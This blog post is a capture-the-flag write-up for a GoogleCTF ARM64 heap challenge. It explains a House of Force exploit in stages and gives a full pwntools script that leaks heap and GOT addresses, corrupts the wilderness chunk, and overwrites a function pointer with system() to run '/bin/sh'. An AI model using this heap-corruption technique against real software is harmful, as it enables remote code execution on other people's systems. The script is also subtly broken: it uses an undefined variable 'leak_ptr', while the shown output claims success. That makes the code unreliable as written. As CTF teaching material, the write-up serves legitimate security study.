---
layout: post
title: GoogleCTF - Exploitation 125
category: [Exploitation]
tags: [Exploitation, GoogleCTF]
comments: true
---

**Points:** 125
**Solves:** 18
**Category:** Exploitation
**Description:** Can you exploit the following binary?

> [forced-puns.tar.gz]({{site.url}}/assets/forced-puns.tar.gz)

Another House of Force exploitation challenge. This one is quite involved, so I decided to do a write-up on it.
The binary is PIE enabled for ARM64 architecture.

{% highlight text %} 
➜  pwn125 checksec app/forced-puns
[*] 'app/forced-puns'
    Arch:          aarch64-64-little
    RELRO:         No RELRO
    Stack Canary:  No canary found
    NX:            NX enabled
    PIE:           PIE enabled
{% endhighlight %}

## Main

The initialization of main includes `setvbuf` to disable buffering and a call to `malloc(8)`.
A function pointer is placed in the malloced buffer. Depending on if env variable `DEBUG` is set, this helping function will print some debugging information. If the `DEBUG` env variable doesnt exist this function will do nothing.

Note: The minimum size of malloced buffer on 64bit system is 0x20 bytes. 0x10 bytes for the metadata and 0x10 bytes for the actual buffer.

Next we have `print_banner()` and `print_menu()`. We also have a call to `malloc(0x800)` that gets executed only once. A ptr to this buffer is placed in `root` variable in the .bss section. In this buffer we will place our input for all functions. After that there's a call to `read(stdin, root, 0x800)`.

![main]({{site.url}}/assets/main_puns.JPG)

The main menu prints:

{% highlight text %}
...
1. Add an entry
2. Print entries
3. Quit
{% endhighlight %}

## Parse_line

The IDA graph for this function is not as descriptive as the one for `main()` so I will just explain the process for each case/switch option.
So, input goes in the 0x800 bytes buffer on the heap and processed by `parse_line()` function.
`3. Quit` calls `exit()`.
`2. Print entries` prints the content of the entries structure used to hold the ptrs or data of our buffers. It uses the following format string for each member.

{% highlight text%}
"Name: %s\n"
"Small: %s\n"
"Large: %p\n"   <---- Notice the '%p'
"-- next --"
{% endhighlight %}

### Structure

The structure used to hold the data looks something like:

{% highlight text %}
struct entries {
	char *large;
	char *small;
	char *next_structure;
	char name[0x88];
}
{% endhighlight %}

This structure gets allocated on the heap by `malloc(0x100)` everytime we chose option `1. Add an entry` from the main menu.

So far the heap will look like this:

{% highlight text %}
[helper fp 0x20] [root 0x800] [entry 0x100] [Wilderness - end of heap]
{% endhighlight %}

## Add entry menu

{% highlight text %}
1. Set name
2. Set small
3. Set large
4. cd ..
{% endhighlight %}

- `1. Set name` does `strcpy(entries->name, root);`. With the root buffer 0x800 bytes and `entries->name` only 0x88 bytes, we have an obvious overflow here.
- `2. Set small` does `strdup(root);`. As we know strdup uses malloc and strcpy internally.
- `3. Set large` does `malloc(strtol(root));` after it asks us for size with "What size should large be?". Strangely it doesn't do anything else and there's no buffer allocated for it.
- `4. cd ..` returns is to the main menu.

As we can see these functions satisfy our requirements to perform House of Force and exploit the heap. However, because the binary is PIE enabled the distance between the different segments like the heap and the .data/.bss is randomized which I consider the main constrain.

## Stage 1 - Leaking the heap address

We can easily get the address of the `entries->large` because the format string `%p` is used. This will provide us with an address on the heap, calculating relative offsets from it we can get the location on all the buffers located on the heap. Because of PIE we can't calculate the distance to the other sections.

## Stage 2 - Leaking the heap stored `[helper fp]`

To leak the stored function pointer at the beginning of the heap, I needed to overwrite any of the pointers stored in the `entries` structure. Because they are placed before the `entries->name` buffer we need to use the House of Force method. So by overwriting the wilderness's metadata by using option number `1. Set name` we can set the size of the wilderness to `2**64` `(or 0xFFFFFFFFFFFFFFFF)`. Than we need to allocate a huge chunk via option `3. Set large` which will do something like `malloc( -0x960 );` which will wrap around the x64 bit address space and end up somewhere on the heap in the root buffer. Once we are there we can go back to the main menu and chose `Set an entry` again to cause another entries structure to be allocated right on top of the `root` buffer. Both structures are linked and we can control the pointers on the second entries structure.

Since we control everything in the root buffer not only we can control the pointers to leak the `helper ptr` but also we can overflow again the metadata of the new wilderness :). After we allocated a negative buffer, we wrapped around 2**64 address space the size of the wilderness will be rather small.

## Stage 3 - Leak an entry from the GOT

Now that we have a pointer to the .data section, we can calculate the distance to the GOT and leak an entry from there using the same method as above. Since everything we need to manipulate is still in the root buffer it will be rather easy.

Once we are done with that we can calculate the distance to `system()`.

So far the heap looks like this:

{% highlight text %}
   low address space
	 start of heap
  +-----------------+
  | helper func ptr |
  +-----------------+
  |   root buffer   |
  | input goes here |
  |                 |
  |                 |<--+
  |                 |   |
  +-----------------+   |
  | entries->large* |   | Stage 2 brings the new wilderness here
  +                 +   | and the buffer for the second entries
  | entries->small* |   | structure.
  +                 +   |
  | entries->next*  |   |
  +                 +   |
  |   name[0x88]    |   |
  +-----------------+   |
  |wildrnss metadata|   |
  +                 + --+
  | wilderness      |


  high address space
{% endhighlight %}

## Stage 4 - Overflowing the helper function with `system()`.

The `helper_func_ptr` is still placed before whatever we can manipulate. So to overflow it I'm going to wrap around the whole address space again and end up right in the beginning of the heap. But before doing that I need to set the argument for `system()`.

The helper function is called with `blr X1` instruction and the address of the first entries structure that currently holds `entries->large`.  So to reach that location I will just allocate a large enough (positive value this time :) buffer using `Set large` and store '/bin/sh' there via `Set small` (remember it's using strdup() so we gotta account for metadata overhead).

After that we can perform another negative allocation to wrap around the 64bit address space and end up right at the beginning of the heap. Once we are there we can just use `Set small` to overwrite the helper function with the address of system and we are done.

## Full script

{% highlight python %}
#!/usr/bin/env python

from pwn import *

r = remote('ssl-added-and-removed-here.ctfcompetition.com', 11111, ssl=True)
#r = remote('localhost', 31337)
sleep(1)
r.recv(timeout=1)
r.recv(timeout=1)

# Stage 1 Leak the heap
r.sendline('1')
r.recv(timeout=1)
r.recv(timeout=1)

r.sendline('3')
r.recv(timeout=1)

r.sendline('AA')
r.recv(timeout=1)

r.sendline('4')
r.recv(timeout=1)

r.sendline('2')
r.recvuntil("Large: ")
leak = int(r.recv(12), 16)
log.info("Leak: " + hex(leak))


# Stage 2 Overflow the wilderness
r.sendline('1')
r.recv(timeout=1)

r.sendline('1')
r.recv(timeout=1)

r.sendline("\xff" * 0x1f8)
r.recv(timeout=1)

# Wrap around to reach the helper ptr
r.sendline('3')
r.recv(timeout=1)

r.sendline(str(-0x960))
r.recv(timeout=1)

r.sendline('4')
r.recv(timeout=1)

r.sendline('1')
r.recv(timeout=1)

r.sendline('4')
r.recv(timeout=1)

payload = p64(0x32)							# <- ASCII '2' for print_entries
payload += p64(0xffffffffffffffff) * 30
payload += p64(0x111)						# restoring the current chunk's metadata
payload += p64(0) * 2
payload += p64(leak - 0x940)
payload += p64(0xffffffffffffffff) * 31 	# overflowing the new wilderness md
r.sendline(payload)

helper_ptr = r.recvuntil('Large: ')
helper_ptr = r.recvuntil('Large: ')
helper_ptr = r.recvuntil('Large: ')
helper_ptr = r.recvuntil('Large: ')
helper_ptr = int(r.recv(12), 16)

log.info("helper ptr: " + hex(helper_ptr))

# Stage 3 - Leak an entry from the GOT
payload = p64(0x32)							# <- ASCII '2' for print_entries
payload += p64(0xffffffffffffffff) * 30
payload += p64(0x111)						# restoring the current chunk's metadata
payload += p64(leak_ptr + 0x11374) * 2
payload += p64(0)
payload += p64(0xffffffffffffffff) * 31 	# overflowing the current wilderness
r.sendline(payload)

leak_strtol = r.recvuntil('Large: ')
leak_strtol = r.recvuntil('Large: ')
leak_strtol = r.recvuntil('Small: ')
leak_strtol = u64(r.recv(5).ljust(8, '\0'))
log.info("Strtol@GOT: " + hex(leak_strtol))

system = leak_strtol + 0x88e8				# Calc system from leak
log.info("System: " + hex(system))

# Stage 4 - Overwriting helper ptr and first entries->large
r.sendline('1')
r.recv(timeout=1)
r.sendline('3')
r.recv(timeout=1)
r.sendline(str(0x490 + 0x50))	# Positive malloc to reach the first entries struct
r.recv(timeout=1)

r.sendline('2')					# Overflow the first entries->large with '/bin/sh'
r.recv(timeout=1)
r.sendline('/bin/sh')
r.recv(timeout=1)

r.sendline('3')
r.recv(timeout=1)
r.sendline(str(-0x860))			# Negative malloc to wrap around and reach
r.recv(timeout=1)				# the beginning of the heap so we can overwrite
r.sendline('2')					# the helper_ptr with system
r.recv(timeout=1)
r.sendline(p64(system))
r.recv(timeout=1)

r.sendline('1')					# cause a call to helper_ptr
r.recv(timeout=1)
r.sendline('1')
r.recv(timeout=1)

r.sendline('ls')
print r.recv(timeout=1)
r.sendline('cat flag')
print r.recv(timeout=1)


#r.interactive()			# <-- broken because of SSL :(
{% endhighlight %}

And the flag

{% highlight text %}
➜  ~ python ctfs/GoogleCTF2016/pwn125/exploit.py
[+] Opening connection to ssl-added-and-removed-here.ctfcompetition.com on port 11111: Done
[*] Leak: 0x5590e5f950
[*] Helper ptr: 0x55829edf54
[*] Strtol@GOT: 0x7f8ba286e8
[*] System: 0x7f8ba30fd0
app
bin
flag
lib
lib64
sbin

CTF{somebody.has.written.gullible.on.the.ceiling.above.you}

[*] Closed connection to ssl-added-and-removed-here.ctfcompetition.com port 11111
{% endhighlight %}